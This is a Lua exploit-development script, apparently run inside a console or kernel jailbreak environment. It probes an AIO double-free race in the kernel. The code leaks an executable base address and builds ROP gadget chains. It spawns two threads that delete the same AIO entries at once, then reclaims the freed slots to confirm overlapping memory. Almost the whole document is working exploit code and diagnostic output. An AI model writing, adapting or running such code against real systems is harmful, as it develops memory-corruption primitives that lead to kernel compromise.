-- CRASH_CLASS: HIGH
-- PROBE 94c: AIO double-free overlap detection v2
--
-- Fixes from 94b:
-- 1. Use /dev/zero reads (always succeed, complete with data)
-- 2. The overlap test: after double-free, submit new AIO entries.
--    If two entries land at same address, deleting one corrupts the other.
--    Test: submit new entries, then delete odd ones and poll even ones.
--    If an even entry's poll fails (unknown ID), its memory was corrupted
--    by the odd deletion writing to shared memory.
--
-- Actually simpler: after double-free, the zone freelist is corrupted.
-- The next TWO allocs of same size return the SAME address.
-- So submit 2 new AIO → they share an entry → delete entry A →
-- entry B's memory is now freed → poll B should fail or return garbage.

print("=== PROBE 94c: AIO OVERLAP v2 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))
local fsbase_ptr = memory.alloc(8)
wq(N(fsbase_ptr), uint64(N(fake_tcb)))

-- Open /dev/zero for AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local reqs = memory.alloc(0x30)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit(fd)
    local data_buf = memory.alloc(0x100)
    local result_buf = memory.alloc(0x10)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = (function()
        local v = uint64(N(data_buf))
        if type(v) == "table" and v.h then return v.h, v.l end
        return 0, N(v)
    end)()
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = (function()
        local v = uint64(N(result_buf))
        if type(v) == "table" and v.h then return v.h, v.l end
        return 0, N(v)
    end)()
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEADDEAD
end

local function delete(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEADDEAD
end

-- ============================
-- Init + pre-drain
-- ============================
print("")
print("[0] Init + pre-drain")
pcall(function() mk(670)() end)
for i = 1, 64 do
    local id = submit(fd_zero)
    if id ~= 0 then poll(id); delete(id) end
end
print("  done")

-- ============================
-- [1] First: verify AIO works and check statuses
-- ============================
print("")
print("[1] AIO status check")
local test_id = submit(fd_zero)
local test_st = poll(test_id)
print(string.format("  submit id=0x%X poll=0x%08X", test_id, test_st))
local del_st = delete(test_id)
print(string.format("  delete status=0x%08X", del_st))
local post_del_st = poll(test_id)
print(string.format("  poll after delete=0x%08X", post_del_st))

-- ============================
-- [2] Race iterations
-- ============================
print("")
print("[2] RACE ITERATIONS")
local ITERS = 10
local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local sp_buf = memory.alloc(8)

local total_doubles = 0
local total_anomalies = 0

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Submit batch
    local ids = {}
    for i = 1, BATCH do
        local id = submit(fd_zero)
        if id ~= 0 then
            poll(id) -- ensure completed
            ids[#ids + 1] = id
        end
    end
    if #ids < 4 then print("  iter " .. iter .. ": too few IDs"); break end
    local count = #ids

    -- Prepare race arrays
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Build child A (NO sysarch — 662 doesn't touch errno)
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662)); emA(stub)
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    -- Build child B (NO sysarch)
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662)); emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    -- Spawn
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0)); wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0)); wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Count doubles
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        -- *** RECLAIM: submit new AIO entries to land on double-freed slots ***
        local reclaim_ids = {}
        local RECLAIM_N = doubles * 4 + 8
        for r = 1, RECLAIM_N do
            local rid = submit(fd_zero)
            if rid ~= 0 then
                reclaim_ids[#reclaim_ids + 1] = rid
            end
        end

        -- Poll all reclaim: they should be completed (/dev/zero reads)
        -- Then delete the FIRST half
        local first_half = math.floor(#reclaim_ids / 2)
        for r = 1, first_half do
            poll(reclaim_ids[r])
            delete(reclaim_ids[r])
        end

        -- Now poll the SECOND half
        -- If any second-half entry shares memory with a deleted first-half entry,
        -- its internal state might be corrupted → unusual poll result
        local anomalies = 0
        for r = first_half + 1, #reclaim_ids do
            local st = poll(reclaim_ids[r])
            -- Normal: 0x00000003 (completed) or 0x00010003 (polled)
            -- Anomaly: 0x80020003 (deleted — shares memory with a deleted entry!)
            -- or 0xDEADDEAD (poll failed — entry corrupted)
            -- or any other unexpected value
            if st ~= 0x00000003 and st ~= 0x00010003 then
                anomalies = anomalies + 1
                if anomalies <= 5 then
                    print(string.format("  iter %d: *** ANOMALY reclaim[%d] id=0x%X status=0x%08X ***",
                        iter, r, reclaim_ids[r], st))
                end
            end
        end
        total_anomalies = total_anomalies + anomalies

        -- Cleanup remaining
        for r = first_half + 1, #reclaim_ids do
            delete(reclaim_ids[r])
        end

        print(string.format("  iter %d: %d doubles, %d reclaim, %d anomalies%s",
            iter, doubles, #reclaim_ids, anomalies,
            anomalies > 0 and " ***HIT***" or ""))
    else
        if iter <= 2 or iter == ITERS then
            print(string.format("  iter %d: 0 doubles", iter))
        end
    end
end

print("")
print(string.format("TOTAL: doubles=%d anomalies=%d alive=%s",
    total_doubles, total_anomalies, alive() and "Y" or "N"))
if total_anomalies > 0 then
    print("*** OVERLAP CONFIRMED: double-free corrupts reclaimed entries ***")
end
print("=== 94c COMPLETE ===")
